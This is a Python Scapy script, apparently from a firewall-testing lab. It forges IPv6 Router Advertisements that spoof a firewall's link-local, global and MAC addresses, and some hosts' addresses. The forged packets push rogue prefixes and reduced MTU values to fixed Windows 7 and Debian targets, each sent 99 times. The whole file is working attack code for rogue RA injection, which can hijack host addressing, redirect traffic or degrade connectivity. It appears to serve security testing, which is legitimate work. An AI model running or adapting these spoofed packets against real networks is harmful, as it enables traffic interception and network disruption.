#!/usr/bin/python

from scapy.all import *


"""
This class test change/addition of prefix and MTU value with Router Advertisement.
"""         
class RA:
    
    def __init__(self):
        self.linux = "2001:abcd:acad:2:a00:27ff:fe84:bb37"
        self.win = "2001:abcd:acad:2:b485:2aec:9447:fd83"
        self.firewall = "2001:abcd:acad:2::1"
        self.firewallMac = "08:00:27:b1:da:41"
        self.linkFirewall = "fe80::1"
        print 'Router Advertisement'

    #test to verify the possibility of exploitment, to be done in internal network
    def buildPacketInternalPrefix(self, ipAdr):
        return IPv6(dst=ipAdr,src=self.linkFirewall)/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefixlen=64,L=1,A=1,R=1,prefix="2001:abcd:1234:1::")/ICMPv6NDOptSrcLLAddr(lladdr=self.firewallMac)


    #test with global unicast of firewall internal int
    def buildPacketPrefix1(self, ipAdr):
        return IPv6(dst=ipAdr,src=self.firewall)/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefixlen=64,L=1,A=1,R=1,prefix="2001:abcd:1234:2::")/ICMPv6NDOptSrcLLAddr(lladdr=self.firewallMac)

    #test with global unicast of debian linux
    def buildPacketPrefix2(self, ipAdr):
        return IPv6(dst=ipAdr,src=self.linux)/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefixlen=64,L=1,A=1,R=1,prefix="2001:abcd:1234:3::")/ICMPv6NDOptSrcLLAddr(lladdr=self.firewallMac)

    #test with global unicast of windows 7
    def buildPacketPrefix3(self, ipAdr):
        return IPv6(dst=ipAdr,src=self.win)/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefixlen=64,L=1,A=1,R=1,prefix="2001:abcd:1234:4::")/ICMPv6NDOptSrcLLAddr(lladdr=self.firewallMac)

    #test with global unicast of firewall internal int L flag is 0
    def buildPacketPrefix4(self, ipAdr):
        return IPv6(dst=ipAdr,src=self.firewall)/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefixlen=64,L=0,A=1,R=1,prefix="2001:abcd:1234:5::")/ICMPv6NDOptSrcLLAddr(lladdr=self.firewallMac)

    #test with global unicast of firewall internal int R flag is 0
    def buildPacketPrefix5(self, ipAdr):
        return IPv6(dst=ipAdr,src=self.firewall)/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefixlen=64,L=1,A=1,R=0,prefix="2001:abcd:1234:6::")/ICMPv6NDOptSrcLLAddr(lladdr=self.firewallMac)

    #test with global unicast of firewall internal int L and R flags are 0
    def buildPacketPrefix6(self, ipAdr):
        return IPv6(dst=ipAdr,src=self.firewall)/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefixlen=64,L=0,A=1,R=0,prefix="2001:abcd:1234:7::")/ICMPv6NDOptSrcLLAddr(lladdr=self.firewallMac)


    #test to verify the possibility of exploitment, to be done in internal network
    def buildPacketInternalMTU(self, ipAdr):
        return IPv6(dst=ipAdr,src=self.linkFirewall)/ICMPv6ND_RA()/ICMPv6NDOptMTU(mtu=1350)

    #test with global unicast of firewall internal interface
    def buildPacketRemoteMTU(self, ipAdr):
        return IPv6(dst=ipAdr,src=self.firewall)/ICMPv6ND_RA()/ICMPv6NDOptMTU(mtu=1360)

    
    def execModuleInternalPrefixWin(self, exitIface):
        packetContainer = self.buildPacketInternalPrefix(self.win)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleInternalPrefixLinux(self, exitIface):
        packetContainer = self.buildPacketInternalPrefix(self.linux)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleInternalMTUWin(self, exitIface):
        packetContainer = self.buildPacketInternalMTU(self.win)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleInternalMTULinux(self, exitIface):
        packetContainer = self.buildPacketInternalMTU(self.linux)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)

    #interfaces for the experiment        
    def execModuleRemotePrefixWin(self, exitIface):
        print "{}".format("Test 1")
        packetContainer = self.buildPacketPrefix1(self.win)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
        print "{}".format("Test 2")
        packetContainer = self.buildPacketPrefix2(self.win)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
        print "{}".format("Test 3")
        packetContainer = self.buildPacketPrefix3(self.win)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
        print "{}".format("Test 4")
        packetContainer = self.buildPacketPrefix4(self.win)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
        print "{}".format("Test 5")
        packetContainer = self.buildPacketPrefix5(self.win)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
        print "{}".format("Test 6")
        packetContainer = self.buildPacketPrefix6(self.win)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
            

    def execModuleRemotePrefixLinux(self, exitIface):
        print "{}".format("Test 1")
        packetContainer = self.buildPacketPrefix1(self.linux)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
        print "{}".format("Test 2")
        packetContainer = self.buildPacketPrefix2(self.linux)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
        print "{}".format("Test 3")
        packetContainer = self.buildPacketPrefix3(self.linux)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
        print "{}".format("Test 4")
        packetContainer = self.buildPacketPrefix4(self.linux)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
        print "{}".format("Test 5")
        packetContainer = self.buildPacketPrefix5(self.linux)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
        print "{}".format("Test 6")
        packetContainer = self.buildPacketPrefix6(self.linux)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
    

    def execModuleRemoteMTUWin(self, exitIface):
        packetContainer = self.buildPacketRemoteMTU(self.win)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleRemoteMTULinux(self, exitIface):
        packetContainer = self.buildPacketRemoteMTU(self.linux)
        for t in range(1,100):
            send(packetContainer, iface=exitIface, verbose=False)
